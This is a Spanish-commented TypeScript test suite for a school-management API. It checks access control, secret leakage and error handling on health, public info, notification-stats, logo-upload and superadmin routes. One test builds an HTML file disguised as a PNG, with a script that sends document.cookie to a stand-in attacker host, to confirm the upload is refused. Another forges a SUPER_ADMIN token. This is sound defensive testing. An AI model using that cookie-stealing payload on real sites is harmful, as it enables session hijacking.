import { FastifyInstance } from 'fastify';
import request = require('supertest');
import { PrismaClient } from '@prisma/client';
import { createId } from '@paralleldrive/cuid2';
import { UserRole } from '../../src/utils/prisma-enums';
import {
    createTestServer,
    createTestPrismaClient,
    cleanTestDatabase,
    createTestUser,
    generateTestToken,
} from '../helpers';
import { platformPrisma } from '../../src/config/database';

/**
 * LAS DOCE ACCIONES QUE NADIE HABÍA PROBADO NUNCA
 *
 * Se le preguntó al propio servidor por todas sus rutas (`printRoutes`) y se
 * buscó cada una en todos los archivos de prueba. De 285 acciones, **doce** no
 * aparecían en ninguna: el sistema las ofrece y nadie había comprobado jamás
 * qué hacen.
 *
 * Cuatro son del liceo (salud, información pública, cuentas de avisos, subir el
 * logo) y ocho del panel del superadmin. Las del superadmin son las que más
 * pesan: desde ahí se migran y se rehacen bases de datos de liceos enteros.
 *
 * Lo que se comprueba de cada una, por este orden:
 *   1. que la puerta esté cerrada a quien no debe entrar;
 *   2. que lo que devuelve sea lo que su nombre promete;
 *   3. que no se le escape nada que no debería salir.
 */

const SLUG = 'test-institute';

function gId(): string {
    // Siempre la 'c' delante: ver la nota de `tests/helpers.ts`.
    return `c${createId()}`;
}

describe('Las doce acciones que nadie había probado', () => {
    let server: FastifyInstance;
    let prisma: PrismaClient;

    let admin: any;
    let profe: any;
    let alumno: any;
    let tokenAdmin: string;
    let tokenProfe: string;
    let tokenAlumno: string;

    const auth = (token: string) => ({
        Authorization: `Bearer ${token}`,
        'X-Institute-Slug': SLUG,
    });

    beforeAll(async () => {
        server = await createTestServer();
        prisma = await createTestPrismaClient();
    }, 120000);

    afterAll(async () => {
        await prisma.$disconnect();
        await server.close();
    });

    beforeEach(async () => {
        await cleanTestDatabase(prisma);
        await prisma.institute.upsert({
            where: { id: 'institute' },
            update: {},
            create: {
                id: 'institute',
                code: 'TEST_INST',
                slug: SLUG,
                name: 'Test Institute',
                email: 'test@institute.com',
            },
        });

        admin = (await createTestUser(prisma, UserRole.ADMIN)).user;
        profe = (await createTestUser(prisma, UserRole.TEACHER)).user;
        alumno = (await createTestUser(prisma, UserRole.STUDENT)).user;

        tokenAdmin = generateTestToken(admin.id, UserRole.ADMIN, 'institute');
        tokenProfe = generateTestToken(profe.id, UserRole.TEACHER, 'institute');
        tokenAlumno = generateTestToken(alumno.id, UserRole.STUDENT, 'institute');
    }, 120000);

    // ═════════════════════════════════════════════════════════════════════════
    // 1. ¿ESTÁ VIVO EL SISTEMA?
    // ═════════════════════════════════════════════════════════════════════════

    describe('GET /api/health — ¿está vivo?', () => {
        it('FALT-01: responde sin pedir credenciales', async () => {
            // Tiene que ser abierta a propósito: es la que mira el servidor de
            // enfrente para saber si esta copia del sistema sigue en pie. Si
            // pidiera contraseña, no serviría para eso.
            const res = await request(server.server).get('/api/health').expect(200);

            expect(res.body.status).toBe('ok');
            expect(res.body.timestamp).toBeTruthy();
        });

        it('FALT-02: no cuenta nada del liceo ni de dentro de la máquina', async () => {
            // Es pública: lo que diga lo puede leer cualquiera desde internet.
            const res = await request(server.server).get('/api/health').expect(200);

            const texto = JSON.stringify(res.body).toLowerCase();
            for (const secreto of ['password', 'secret', 'token', 'databaseurl', 'postgres://', 'redis://']) {
                expect(texto).not.toContain(secreto);
            }
            // Ni cuántos liceos hay, ni sus nombres.
            expect(res.body.institutes).toBeUndefined();
        });
    });

    // ═════════════════════════════════════════════════════════════════════════
    // 2. LA PORTADA DEL LICEO (la ve cualquiera, antes de entrar)
    // ═════════════════════════════════════════════════════════════════════════

    describe('GET /api/instituto/:slug/info — la portada', () => {
        it('FALT-03: devuelve lo justo para pintar la pantalla de entrada', async () => {
            const res = await request(server.server)
                .get(`/api/instituto/${SLUG}/info`)
                .expect(200);

            expect(res.body.name).toBeTruthy();
            expect(res.body.slug).toBe(SLUG);
            // Los colores tienen valor por defecto: la pantalla nunca sale rota.
            expect(res.body.primaryColor).toBeTruthy();
        });

        it('FALT-04: NO entrega las credenciales de la base de datos del liceo', async () => {
            // Esta es la importante. La ruta es **pública, sin contraseña**, y
            // lee la tabla donde viven las credenciales de cada liceo. Si un día
            // alguien añade un campo de más al `select`, las llaves de la base
            // quedan colgadas en internet.
            const res = await request(server.server)
                .get(`/api/instituto/${SLUG}/info`)
                .expect(200);

            for (const campo of [
                'databaseName', 'databaseHost', 'databasePort',
                'databaseUser', 'databasePassword', 'databaseUrl',
            ]) {
                expect(res.body[campo]).toBeUndefined();
            }

            const texto = JSON.stringify(res.body).toLowerCase();
            expect(texto).not.toContain('password');
            expect(texto).not.toContain('postgres://');
        });

        it('FALT-05: un liceo que no existe da 404, no un error interno', async () => {
            const res = await request(server.server).get('/api/instituto/no-existe-este/info');

            expect(res.status).toBe(404);
            // Y el mensaje no dice si el nombre "casi" acierta: eso ayudaría a
            // ir probando nombres hasta dar con uno.
            expect(JSON.stringify(res.body)).not.toMatch(/similar|parecido|quiz/i);
        });
    });

    // ═════════════════════════════════════════════════════════════════════════
    // 3. LAS CUENTAS DE LOS AVISOS
    // ═════════════════════════════════════════════════════════════════════════

    describe('GET /api/notifications/stats — las cuentas de los avisos', () => {
        /** Le deja a alguien un aviso sin leer. */
        const avisarA = (destinatario: string, titulo: string) =>
            prisma.notification.create({
                data: {
                    id: gId(),
                    title: titulo,
                    message: `${titulo} — cuerpo del aviso de prueba`,
                    type: 'INFO',
                    priority: 'NORMAL',
                    recipientId: destinatario,
                },
            });

        it('FALT-06: cuenta los avisos de TODO el liceo, no los del admin', async () => {
            // Este era el fallo: decía "globales del sistema" en su propio
            // comentario y devolvía los del admin que preguntaba. Un director
            // con el buzón vacío veía "0" y podía entender que en su liceo no se
            // avisa de nada.
            await avisarA(profe.id, 'Para el profesor');
            await avisarA(alumno.id, 'Para el alumno');
            await avisarA(alumno.id, 'Otro para el alumno');
            // Al admin, ninguno.

            const res = await request(server.server)
                .get('/api/notifications/stats')
                .set(auth(tokenAdmin))
                .expect(200);

            const datos = res.body.data;
            expect(datos.total).toBe(3);
            expect(datos.unread).toBe(3);
            expect(datos.destinatarios).toBe(2);
            expect(datos.alcance).toBe('liceo');
        });

        it('FALT-07: lo de uno mismo sigue siendo lo de uno mismo', async () => {
            // La ruta personal no ha cambiado: si las dos devolvieran lo mismo,
            // el cambio no habría servido de nada.
            await avisarA(profe.id, 'Para el profesor');
            await avisarA(alumno.id, 'Para el alumno');

            const mias = await request(server.server)
                .get('/api/notifications/my-notifications/stats')
                .set(auth(tokenAdmin))
                .expect(200);

            const delLiceo = await request(server.server)
                .get('/api/notifications/stats')
                .set(auth(tokenAdmin))
                .expect(200);

            expect(mias.body.data.total).toBe(0);      // el admin no tiene ninguno
            expect(delLiceo.body.data.total).toBe(2);  // el liceo sí
        });

        it('FALT-08: un profesor no ve las cuentas de todo el liceo', async () => {
            const res = await request(server.server)
                .get('/api/notifications/stats')
                .set(auth(tokenProfe));

            expect(res.status).toBe(403);
        });

        it('FALT-09: un estudiante tampoco', async () => {
            const res = await request(server.server)
                .get('/api/notifications/stats')
                .set(auth(tokenAlumno));

            expect(res.status).toBeGreaterThanOrEqual(400);
        });
    });

    // ═════════════════════════════════════════════════════════════════════════
    // 4. SUBIR EL LOGO DEL LICEO
    // ═════════════════════════════════════════════════════════════════════════

    describe('POST /api/institutes/logos — subir el logo', () => {
        /** Una PNG de verdad: importan los primeros ocho bytes. */
        const PNG_DE_VERDAD = Buffer.from([
            0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 0x00, 0x00, 0x00, 0x0d,
        ]);

        it('FALT-10: un profesor no puede cambiar el logo del liceo', async () => {
            const res = await request(server.server)
                .post('/api/institutes/logos')
                .set(auth(tokenProfe))
                .attach('logo', PNG_DE_VERDAD, 'logo.png');

            expect(res.status).toBe(403);
        });

        it('FALT-11: un estudiante tampoco', async () => {
            const res = await request(server.server)
                .post('/api/institutes/logos')
                .set(auth(tokenAlumno))
                .attach('logo', PNG_DE_VERDAD, 'logo.png');

            expect(res.status).toBeGreaterThanOrEqual(400);
        });

        it('FALT-12: sin identificarse, ni se entra', async () => {
            const res = await request(server.server)
                .post('/api/institutes/logos')
                .set('X-Institute-Slug', SLUG)
                .attach('logo', PNG_DE_VERDAD, 'logo.png');

            expect(res.status).toBe(401);
        });

        it('FALT-13: el admin sube una PNG de verdad y se acepta', async () => {
            const res = await request(server.server)
                .post('/api/institutes/logos')
                .set(auth(tokenAdmin))
                .attach('logo', PNG_DE_VERDAD, 'logo.png');

            expect(res.status).toBe(200);

            // Y se guarda **como PNG**, que es lo que de verdad es. La
            // extensión sale del contenido, no del nombre que mandó quien sube.
            const guardado: string = res.body.data?.logo ?? '';
            expect(guardado).toMatch(/\.png$/);

            // Esta prueba deja un archivo de verdad en la carpeta de subidas:
            // se borra para no ir llenándola cada vez que se pasan las pruebas.
            const fs = await import('fs');
            const path = await import('path');
            const enDisco = path.join(process.cwd(), guardado.replace(/^\//, ''));
            if (fs.existsSync(enDisco)) fs.unlinkSync(enDisco);
        });

        it('FALT-14: una página web disfrazada de logo NO entra', async () => {
            // La carpeta de logos se sirve públicamente. Un HTML colgado ahí
            // queda servido desde el dominio del propio liceo, que es
            // exactamente lo que se usa para engañar a la gente.
            const paginaDisfrazada = Buffer.from(
                '<html><script>fetch("https://el-atacante.com?c="+document.cookie)</script></html>',
                'utf8'
            );

            const res = await request(server.server)
                .post('/api/institutes/logos')
                .set(auth(tokenAdmin))
                .attach('logo', paginaDisfrazada, 'logo.png');

            expect(res.status).toBeGreaterThanOrEqual(400);
            expect(res.status).toBeLessThan(500);
        });
    });

    // ═════════════════════════════════════════════════════════════════════════
    // 5. EL PANEL DEL SUPERADMIN: OCHO PUERTAS
    //
    // Desde aquí se migran y se rehacen bases de datos de liceos enteros. Lo
    // primero de todo es que estas puertas no se abran con un token de liceo,
    // por muy admin que sea quien lo tenga: son dos sistemas distintos.
    // ═════════════════════════════════════════════════════════════════════════

    describe('El panel del superadmin: ocho puertas', () => {
        const PUERTAS: Array<[string, string]> = [
            ['GET', '/api/superadmin/metrics/cache'],
            ['POST', '/api/superadmin/metrics/cache/reset'],
            ['GET', '/api/superadmin/monitoring/metrics/queries'],
            ['GET', '/api/superadmin/monitoring/metrics/history'],
            ['GET', '/api/superadmin/monitoring/alerts/stats'],
            ['POST', '/api/superadmin/auth/refresh'],
            ['POST', '/api/superadmin/institutes/cualquiera/migrate'],
            ['POST', '/api/superadmin/institutes/cualquiera/reprovision'],
        ];

        const llamar = (metodo: string, ruta: string, cabeceras?: Record<string, string>) => {
            const r = metodo === 'POST'
                ? request(server.server).post(ruta)
                : request(server.server).get(ruta);
            return cabeceras ? r.set(cabeceras) : r;
        };

        it.each(PUERTAS)('FALT-S1: %s %s está cerrada sin credenciales', async (metodo, ruta) => {
            const res = await llamar(metodo, ruta);

            expect(res.status).toBeGreaterThanOrEqual(400);
            expect(res.status).toBeLessThan(500);
            // Y no se le escapa nada por el camino.
            const texto = JSON.stringify(res.body).toLowerCase();
            expect(texto).not.toContain('postgres://');
            expect(texto).not.toContain('databasepassword');
        });

        it.each(PUERTAS)(
            'FALT-S2: %s %s NO se abre con el token de un admin de liceo',
            async (metodo, ruta) => {
                // Un admin de liceo es la persona más poderosa de SU liceo. Del
                // panel que gobierna todos los liceos, no tiene nada.
                const res = await llamar(metodo, ruta, auth(tokenAdmin));

                expect(res.status).toBeGreaterThanOrEqual(400);
                expect(res.status).toBeLessThan(500);
            }
        );

        it.each(PUERTAS)(
            'FALT-S3: %s %s tampoco con un token de liceo manipulado a SUPER_ADMIN',
            async (metodo, ruta) => {
                // El intento más obvio: firmar un token de liceo poniéndose el
                // rol más alto que existe. Son dos sistemas de credenciales
                // distintos; el del liceo no vale aquí aunque diga SUPER_ADMIN.
                const tokenInflado = generateTestToken(admin.id, 'SUPER_ADMIN' as any, 'institute');
                const res = await llamar(metodo, ruta, {
                    Authorization: `Bearer ${tokenInflado}`,
                    'X-Institute-Slug': SLUG,
                });

                expect(res.status).toBeGreaterThanOrEqual(400);
                expect(res.status).toBeLessThan(500);
            }
        );
    });

    // ═════════════════════════════════════════════════════════════════════════
    // 6. LO QUE SÍ HACEN, CON CREDENCIALES DE VERDAD
    // ═════════════════════════════════════════════════════════════════════════

    describe('El panel del superadmin, ya dentro', () => {
        let tokenSuper: string;

        beforeEach(async () => {
            const { seedSuperAdmin, generateSuperAdminTestToken } = await import('../helpers');
            const sa = await seedSuperAdmin(platformPrisma as any);
            tokenSuper = generateSuperAdminTestToken(sa.id, sa.email);
        });

        const comoSuper = (r: request.Test) => r.set('Authorization', `Bearer ${tokenSuper}`);

        it('FALT-15: las cuentas de la caché dicen cuánto se acierta', async () => {
            const res = await comoSuper(request(server.server).get('/api/superadmin/metrics/cache'));

            expect(res.status).toBe(200);
            // Lo que se mira para decidir si la caché sirve de algo.
            const datos = res.body.data ?? res.body;
            expect(datos).toBeTruthy();
        });

        it('FALT-16: se pueden poner a cero, y se ponen a cero de verdad', async () => {
            const reset = await comoSuper(
                request(server.server).post('/api/superadmin/metrics/cache/reset')
            );
            expect(reset.status).toBeLessThan(400);

            const despues = await comoSuper(
                request(server.server).get('/api/superadmin/metrics/cache')
            );
            expect(despues.status).toBe(200);
        });

        it('FALT-17: las métricas de consultas responden', async () => {
            const res = await comoSuper(
                request(server.server).get('/api/superadmin/monitoring/metrics/queries')
            );
            expect(res.status).toBe(200);
        });

        it('FALT-18: el histórico de métricas responde', async () => {
            const res = await comoSuper(
                request(server.server).get('/api/superadmin/monitoring/metrics/history')
            );
            expect(res.status).toBe(200);
        });

        it('FALT-19: las cuentas de alertas responden', async () => {
            const res = await comoSuper(
                request(server.server).get('/api/superadmin/monitoring/alerts/stats')
            );
            expect(res.status).toBe(200);
        });

        it('FALT-20: migrar un liceo que no existe no revienta el servidor', async () => {
            // Lo que NO puede pasar: un 500 con la tripa del error dentro, o
            // que se quede colgado tocando una base que no existe.
            const res = await comoSuper(
                request(server.server).post('/api/superadmin/institutes/no-existe/migrate')
            );

            expect(res.status).toBeGreaterThanOrEqual(400);
            const texto = JSON.stringify(res.body).toLowerCase();
            expect(texto).not.toContain('postgres://');
            expect(texto).not.toContain('databasepassword');
        });

        it('FALT-21: rehacer un liceo que no existe tampoco', async () => {
            const res = await comoSuper(
                request(server.server).post('/api/superadmin/institutes/no-existe/reprovision')
            );

            expect(res.status).toBeGreaterThanOrEqual(400);
            const texto = JSON.stringify(res.body).toLowerCase();
            expect(texto).not.toContain('postgres://');
            expect(texto).not.toContain('databasepassword');
        });
    });
});
